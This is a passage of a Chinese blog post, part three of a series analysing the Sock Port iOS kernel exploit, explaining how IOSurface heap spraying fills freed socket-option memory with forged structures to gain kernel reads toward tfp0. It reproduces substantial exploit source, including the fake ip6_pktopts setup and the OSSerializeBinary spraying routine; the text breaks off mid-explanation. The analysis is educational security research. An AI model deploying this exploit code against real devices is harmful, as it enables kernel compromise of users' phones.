<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Sock Port 漏洞解析（三）IOSurface Heap Spraying"><meta name="keywords" content="SockPort,UAF,Heap Spraying,IOSurface"><meta name="author" content="高级页面仔 (Soulghost)"><meta name="copyright" content="高级页面仔 (Soulghost)"><title>Sock Port 漏洞解析（三）IOSurface Heap Spraying | iOS Security Cabin</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IOSurface-是什么"><span class="toc-number">2.</span> <span class="toc-text">IOSurface 是什么</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IOSurface-Heap-Spraying-使用场景"><span class="toc-number">3.</span> <span class="toc-text">IOSurface Heap Spraying 使用场景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IOSurface-Heap-Spraying-详解"><span class="toc-number">4.</span> <span class="toc-text">IOSurface Heap Spraying 详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XML-构造"><span class="toc-number">4.1.</span> <span class="toc-text">XML 构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XML-Spraying-原理"><span class="toc-number">4.1.1.</span> <span class="toc-text">XML Spraying 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关键数据计算"><span class="toc-number">4.1.2.</span> <span class="toc-text">关键数据计算</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造过程"><span class="toc-number">4.1.3.</span> <span class="toc-text">构造过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#组装数据"><span class="toc-number">4.2.</span> <span class="toc-text">组装数据</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#使用-IOSurface-Heap-Spraying-实现-kread"><span class="toc-number">5.</span> <span class="toc-text">使用 IOSurface Heap Spraying 实现 kread</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#下节预告"><span class="toc-number">7.</span> <span class="toc-text">下节预告</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">8.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://avatars0.githubusercontent.com/u/6300263?s=460&amp;u=c55866a279854c9150528b358802a75be5e6a507&amp;v=4"></div><div class="author-info__name text-center">高级页面仔 (Soulghost)</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/Soulghost" target="_blank" rel="noopener">Follow Me on GitHub</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">11</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">19</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">iOS Security Cabin</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">Sock Port 漏洞解析（三）IOSurface Heap Spraying</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-12-01</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在上一篇文章中，我们介绍了基于 OOL Message 的 Port Address Spraying，这种 Spraying 的局限性很大，只能对已释放区域填充 Port Address。实现 tfp0 的一个关键点是在已释放区域填充任意数据，这就需要我们寻找其他函数作为 Heap Spraying 的工具。</p>
<p>本文将介绍一种基于 IOSurface 的 Heap Spraying 方法，通过该方法能够实现将任意数据喷射到内核指定位置。</p>
<h1 id="IOSurface-是什么"><a href="#IOSurface-是什么" class="headerlink" title="IOSurface 是什么"></a>IOSurface 是什么</h1><p>根据苹果的文档[1]，IOSurface Framework 的功能如下：</p>
<blockquote>
<p>The IOSurface framework provides a framebuffer object suitable for sharing across process boundaries. It is commonly used to allow applications to move complex image decompression and draw logic into a separate process to enhance security.</p>
</blockquote>
<p>即 IOSurface.framework 提供了一个跨进程共享的帧缓冲区，它常常用于把复杂的图片解码与绘制逻辑分离到单独的进程以提高安全性。</p>
<p>了解了 IOSurface.framework，接下来根据 iPhone Dev Wiki 给出的描述[2]：</p>
<blockquote>
<p>IOSurface is an object encompassing a kernel-managed rectangular pixel buffer in the IOSurface framework. It is a thin wrapper on top of an IOSurfaceClient object which actually interfaces with the kernel.</p>
</blockquote>
<p>从这段描述我们可以提取出有效信息：IOSurface 是一个被内核管理的对象，它是在 IOSurfaceClient 之上的一个封装，既然这个对象被分配到内核的内存区域，我们就有机会利用它实现 Kernel Heap Spraying。</p>
<h1 id="IOSurface-Heap-Spraying-使用场景"><a href="#IOSurface-Heap-Spraying-使用场景" class="headerlink" title="IOSurface Heap Spraying 使用场景"></a>IOSurface Heap Spraying 使用场景</h1><p>在<a href="https://juejin.im/post/5dd918d051882573180a2ba7#heading-7" target="_blank" rel="noopener">上一篇文章</a> 的 Sock Port 概览中我们提到可借助 <code>in6p_outputopts</code> 成员实现不稳定的内核内存读取和释放，其实现原理是先伪造一个 <code>in6p_outputopts</code> 结构体，利用 minmtu 成员作为标志位，再额外利用一个结构体指针 <code>in6_pktinfo</code> 赋予我们想要读取的地址，如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create a fake struct with our dangling port address as its pktinfo</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip6_pktopts</span> *<span class="title">fake_opts</span> = <span class="title">calloc</span>(1, <span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ip6_pktopts</span>));</span></span><br><span class="line"><span class="comment">// give a number we can recognize</span></span><br><span class="line">fake_opts-&gt;ip6po_minmtu = <span class="number">0x41424344</span>; </span><br><span class="line"><span class="comment">// on iOS 10, minmtu offset is different</span></span><br><span class="line">*(<span class="keyword">uint32_t</span>*)((<span class="keyword">uint64_t</span>)fake_opts + <span class="number">164</span>) = <span class="number">0x41424344</span>;</span><br><span class="line"><span class="comment">// address to read</span></span><br><span class="line">fake_opts-&gt;ip6po_pktinfo = (struct in6_pktinfo*)addr;</span><br></pre></td></tr></table></figure>

<p>然后我们利用 Socket UAF 制造大量的已释放 <code>in6p_outputopts</code> 区域，随后将上述伪造的数据喷射到 Socket UAF 区域，通过 getsockopt 函数读取 minmtu 确认 Spraying 成功，成功后再通过 getsockopt 读取 <code>ip6po_pktinfo</code> 结构体，由于 <code>ip6po_pktinfo</code> 的大小为 20B，我们通过这种方式一次性可以读取目标地址的 20B 数据。</p>
<p>不难看出，上述问题的关键在于如何实现 <code>faked in6p_outputopts</code> 的 Spraying，而 IOSurface 能够向内核的帧缓冲区发送任意数据，因此非常适合这个场景。</p>
<h1 id="IOSurface-Heap-Spraying-详解"><a href="#IOSurface-Heap-Spraying-详解" class="headerlink" title="IOSurface Heap Spraying 详解"></a>IOSurface Heap Spraying 详解</h1><p>首先我们看到 Sock Port 2 提供的 IOSurface 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spray_IOSurface</span><span class="params">(<span class="keyword">void</span> *data, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !IOSurface_spray_with_gc(<span class="number">32</span>, <span class="number">256</span>, data, (<span class="keyword">uint32_t</span>)<span class="built_in">size</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span></span><br><span class="line">IOSurface_spray_with_gc(<span class="keyword">uint32_t</span> array_count, <span class="keyword">uint32_t</span> array_length,</span><br><span class="line">		<span class="keyword">void</span> *data, <span class="keyword">uint32_t</span> data_size,</span><br><span class="line">		<span class="keyword">void</span> (^callback)(<span class="keyword">uint32_t</span> array_id, <span class="keyword">uint32_t</span> data_id, <span class="keyword">void</span> *data, <span class="keyword">size_t</span> <span class="built_in">size</span>)) &#123;</span><br><span class="line">	<span class="keyword">return</span> IOSurface_spray_with_gc_internal(array_count, array_length, <span class="number">0</span>,</span><br><span class="line">			data, data_size, callback);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 Facade 函数为 <code>spray_IOSurface</code>，只需要提供待 Spraying 的数据和大小即可，它是 <code>IOSurface_spray_with_gc</code> 的简单封装，提供了对生成的 OSArray 的默认配置，<code>array_count = 32</code> 代表生成 32 个 Spraying Array，即进行 32 次 Heap Spraying，而 <code>array_length = 256</code> 代表每个数组中包含了 256 个 Spraying Data。</p>
<h2 id="XML-构造"><a href="#XML-构造" class="headerlink" title="XML 构造"></a>XML 构造</h2><p>在 <code>IOSurface_spray_with_gc_internal</code> 函数中，首先完成的是 OSSerializeBinary XML 的构造：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span></span><br><span class="line">IOSurface_spray_with_gc_internal(uint32_t array_count, uint32_t array_length, uint32_t extra_count, <span class="keyword">void</span> *data, uint32_t data_size, <span class="keyword">void</span> (^callback)(uint32_t array_id, uint32_t data_id, <span class="keyword">void</span> *data, size_t size)) &#123;</span><br><span class="line">    <span class="comment">// 1. 创建一个 IOSurfaceRootClient 对象与内核通信</span></span><br><span class="line">    <span class="comment">// Make sure our IOSurface is initialized.</span></span><br><span class="line">    <span class="keyword">bool</span> ok = IOSurface_init();</span><br><span class="line">    <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. 我们当前的使用方式下 extra_count = 0，因此可以忽略 extra_count</span></span><br><span class="line">    <span class="comment">// How big will our OSUnserializeBinary dictionary be?</span></span><br><span class="line">    uint32_t current_array_length = array_length + (extra_count &gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. 计算 Spraying Data 所需要的 XML 结点数</span></span><br><span class="line">    size_t xml_units_per_data = xml_units_for_data_size(data_size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4. 这里的多个 1 代表除去 Spraying Data 外的固定 XML 结点，后面具体构造会看到</span></span><br><span class="line">    size_t xml_units = <span class="number">1</span> + <span class="number">1</span> + <span class="number">1</span> + (<span class="number">1</span> + xml_units_per_data) * current_array_length + <span class="number">1</span> + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 5. 构造传入内核的 args，包含了待构造 xml 与其他描述内容</span></span><br><span class="line">    <span class="comment">// Allocate the args struct.</span></span><br><span class="line">    <span class="keyword">struct</span> IOSurfaceValueArgs *args;</span><br><span class="line">    size_t args_size = <span class="keyword">sizeof</span>(*args) + xml_units * <span class="keyword">sizeof</span>(args-&gt;xml[<span class="number">0</span>]);</span><br><span class="line">    args = malloc(args_size);</span><br><span class="line">    assert(args != <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Build the IOSurfaceValueArgs.</span></span><br><span class="line">    args-&gt;surface_id = IOSurface_id;</span><br><span class="line">    <span class="comment">// Create the serialized OSArray. We'll remember the locations we need to fill in with our</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 6. 每个 XML 都包含了一个 OSArray 来容纳 Spraying Data</span></span><br><span class="line">    <span class="comment">// 这里的 xml_data 数组即容纳 current_array_length(256) 个 xml_data</span></span><br><span class="line">    <span class="comment">// 每个 xml_data 包含一个 Spraying Data，它由多个 xml 结点组成</span></span><br><span class="line">    <span class="comment">// data as well as the slot we need to set our key.</span></span><br><span class="line">    uint32_t **xml_data = malloc(current_array_length * <span class="keyword">sizeof</span>(*xml_data));</span><br><span class="line">    assert(xml_data != <span class="literal">NULL</span>);</span><br><span class="line">    uint32_t *key;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 7. 构造 XML</span></span><br><span class="line">    size_t xml_size = serialize_IOSurface_data_array(args-&gt;xml,</span><br><span class="line">    		current_array_length, data_size, xml_data, &amp;key);</span><br><span class="line">    assert(xml_size == xml_units * <span class="keyword">sizeof</span>(args-&gt;xml[<span class="number">0</span>]));</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>上述构造过程较为复杂，总共有 7 个关键步骤，在上面的代码中已通过注释的方式说明，读者可先粗略了解一下整个过程，接下来我们详细分析这些过程。</p>
<h3 id="XML-Spraying-原理"><a href="#XML-Spraying-原理" class="headerlink" title="XML Spraying 原理"></a>XML Spraying 原理</h3><p>在上述步骤 7 中我们构造了一个装有 256 个 OSString 的 OSArray，其中 OSString 为序列化的 Spraying Data，通过 IOSurfaceRootClient 将 XML 送入内核缓冲区后，内核会为这些 OSString 分配空间，而 OSString 就是我们需要喷射的数据，因此通过这种方式成功的实现了任意数据的 Heap Spraying。</p>
<h3 id="关键数据计算"><a href="#关键数据计算" class="headerlink" title="关键数据计算"></a>关键数据计算</h3><p>用于 IOSurface 传输的 XML 对象的每个结点都可以用一个 uint32 表示，称为 XML Unit，由于 IOSurface 调用必须指定输入的长度，因此计算好每一轮 Spraying 使用的 XML 大小至关重要。</p>
<p>在步骤 3 中，我们计算了 Spraying Data 对应的 XML Units 数量：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. 计算 Spraying Data 所需要的 XML 结点数</span></span><br><span class="line"><span class="keyword">size_t</span> xml_units_per_data = xml_units_for_data_size(data_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * xml_units_for_data_size</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> * 	Return the number of XML units needed to store the given size of data in an OSString.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span></span><br><span class="line">xml_units_for_data_size(<span class="keyword">size_t</span> data_size) &#123;</span><br><span class="line">    <span class="keyword">return</span> ((data_size - <span class="number">1</span>) + <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>) - <span class="number">1</span>) / <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于序列化数据在内核中被表示为 OSString，所以我们需要考虑结尾的 <code>\0</code>，此时只能牺牲数据的最后一位作为 <code>\0</code>，因此实际计算的大小为 <code>size - 1</code>，接下来的公式就转化为 <code>(actual_size + n - 1) / n</code>，这是典型的 Ceiling 函数，即对 actual_size 除以 4(XML Unit Size) 向上取整，最后得到的是每个 Spraying Data 对应的 OSString 所占据的 XML Units Count，并存储在 <code>xml_units_per_data</code> 中。</p>
<p>随后在步骤 4 中，我们基于 <code>xml_units_per_data</code> 计算了 XML Units Count 的总数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> xml_units = <span class="number">1</span> + <span class="number">1</span> + <span class="number">1</span> + (<span class="number">1</span> + xml_units_per_data) * current_array_length + <span class="number">1</span> + <span class="number">1</span> + <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>其中 <code>(1 + xml_units_per_data) * current_array_length</code> 不难理解，即将 OSString Header + Data 结构重复 <code>current_array_length</code> 次后的 Units Count，前后的 3 个 1 均表示额外的描述性 XML Units。</p>
<p>最后在步骤 6 中，我们准备了一个 XML Units 指针数组，用于指向 XML 中待填充 OSString 的 <code>current_array_length</code> 个区域的 Child Unit Header：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint32_t</span> **xml_data = <span class="built_in">malloc</span>(current_array_length * <span class="keyword">sizeof</span>(*xml_data));</span><br></pre></td></tr></table></figure>

<p>该数组会在 XML 构建过程中使用，将 <code>current_array_length</code> 个 OSString 的 Header Unit Address 保存下来，以便接下来将 Spraying Data 拷贝到 XML 中。</p>
<h3 id="构造过程"><a href="#构造过程" class="headerlink" title="构造过程"></a>构造过程</h3><p>构造的关键在步骤 7 对 <code>serialize_IOSurface_data_array</code> 的调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IOSurfaceValueArgs</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> surface_id;</span><br><span class="line">    <span class="keyword">uint32_t</span> _out1;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> xml[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">char</span> <span class="built_in">string</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IOSurfaceValueArgs</span> *<span class="title">args</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> args_size = <span class="keyword">sizeof</span>(*args) + xml_units * <span class="keyword">sizeof</span>(args-&gt;xml[<span class="number">0</span>]);</span><br><span class="line">args = <span class="built_in">malloc</span>(args_size);</span><br><span class="line"><span class="comment">// 7. 构造 XML</span></span><br><span class="line"><span class="keyword">uint32_t</span> *key;</span><br><span class="line"><span class="keyword">uint32_t</span> **xml_data = <span class="built_in">malloc</span>(current_array_length * <span class="keyword">sizeof</span>(*xml_data));</span><br><span class="line"><span class="keyword">size_t</span> xml_size = serialize_IOSurface_data_array(args-&gt;xml, current_array_length, data_size, xml_data, &amp;key);</span><br></pre></td></tr></table></figure>

<p>这里的 <code>args-&gt;xml</code> 即 XML Units 指针，它通过指向一个 XML Header Unit 来引用 XML。</p>
<p>由于前期准备充分，这里的计算并不复杂，只是对 XML 链表的拼接：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span></span><br><span class="line">serialize_IOSurface_data_array(<span class="keyword">uint32_t</span> *xml0, <span class="keyword">uint32_t</span> array_length, <span class="keyword">uint32_t</span> data_size, <span class="keyword">uint32_t</span> **xml_data, <span class="keyword">uint32_t</span> **key) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> *xml = xml0;</span><br><span class="line">    *xml++ = kOSSerializeBinarySignature;</span><br><span class="line">    *xml++ = kOSSerializeArray | <span class="number">2</span> | kOSSerializeEndCollection;</span><br><span class="line">    *xml++ = kOSSerializeArray | array_length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; array_length; i++) &#123;</span><br><span class="line">    	<span class="keyword">uint32_t</span> flags = (i == array_length - <span class="number">1</span> ? kOSSerializeEndCollection : <span class="number">0</span>);</span><br><span class="line">    	*xml++ = kOSSerializeData | (data_size - <span class="number">1</span>) | flags;</span><br><span class="line">    	xml_data[i] = xml;</span><br><span class="line">    	xml += xml_units_for_data_size(data_size);</span><br><span class="line">    &#125;</span><br><span class="line">    *xml++ = kOSSerializeSymbol | <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>) + <span class="number">1</span> | kOSSerializeEndCollection;</span><br><span class="line">    *key = xml++; <span class="comment">// This will be filled in on each array loop.</span></span><br><span class="line">    *xml++ = <span class="number">0</span>;	<span class="comment">// Null-terminate the symbol.</span></span><br><span class="line">    <span class="keyword">return</span> (xml - xml0) * <span class="keyword">sizeof</span>(*xml);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>xml0</code> 为当前 XML 的 Header Units，我们定义一个 <code>xml</code> 变量作为 Cursor，逐步构建 XML，每个 XML Unit 都由一个 uint32 描述，以头部 3 句为例:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*xml++ = kOSSerializeBinarySignature;</span><br><span class="line">*xml++ = kOSSerializeArray | <span class="number">2</span> | kOSSerializeEndCollection;</span><br><span class="line">*xml++ = kOSSerializeArray | array_length;</span><br></pre></td></tr></table></figure>

<p>它相当于声明了如下 XML 结构：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeBinarySignature</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeArray</span>&gt;</span>2<span class="tag">&lt;/<span class="name">kOSSerializeArray</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeArray</span> <span class="attr">length</span>=<span class="string">$&#123;array_length&#125;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>它正好是上文中计算 XML Units Count 的前面 3 个 1。</p>
<p>随后的循环中将 <code>array_length</code> 个 OSString 填充到 OSArray 中，并将这些 OSString 的 XML Unit Address 存入 <code>xml_data</code> 指针数组：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; array_length; i++) &#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> flags = (i == array_length - <span class="number">1</span> ? kOSSerializeEndCollection : <span class="number">0</span>);</span><br><span class="line">	*xml++ = kOSSerializeData | (data_size - <span class="number">1</span>) | flags;</span><br><span class="line">	xml_data[i] = xml;</span><br><span class="line">	xml += xml_units_for_data_size(data_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这构建了如下的 XML：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeBinarySignature</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeArray</span>&gt;</span>2<span class="tag">&lt;/<span class="name">kOSSerializeArray</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeArray</span> <span class="attr">length</span>=<span class="string">$&#123;array_length&#125;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">kOSSerializeData</span> <span class="attr">length</span>=<span class="string">$&#123;data_size</span> <span class="attr">-</span> <span class="attr">1</span>&#125;&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xml_data[0] --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">kOSSerializeData</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">kOSSerializeData</span> <span class="attr">length</span>=<span class="string">$&#123;data_size</span> <span class="attr">-</span> <span class="attr">1</span>&#125;&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xml_data[1] --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">kOSSerializeData</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ... --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">kOSSerializeData</span> <span class="attr">length</span>=<span class="string">$&#123;data_size</span> <span class="attr">-</span> <span class="attr">1</span>&#125;&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xml_data[array_length - 1] --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">kOSSerializeData</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">kOSSerializeArray</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后填充的是尾部的 XML Units：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*xml++ = kOSSerializeSymbol | <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>) + <span class="number">1</span> | kOSSerializeEndCollection;</span><br><span class="line">*key = xml++; <span class="comment">// This will be filled in on each array loop.</span></span><br><span class="line">*xml++ = <span class="number">0</span>; <span class="comment">// Null-terminate the symbol.</span></span><br></pre></td></tr></table></figure>

<p>这里包含了 3 个 Units：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeSymbol</span>&gt;</span>$&#123;sizeof(uint32_t) + 1&#125;<span class="tag">&lt;/<span class="name">kOSSerializeSymbol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>$&#123;key&#125;<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>这也印证了上文 XML Units 计算的尾部的 +3，因此最后得到的 XML 为：</p>
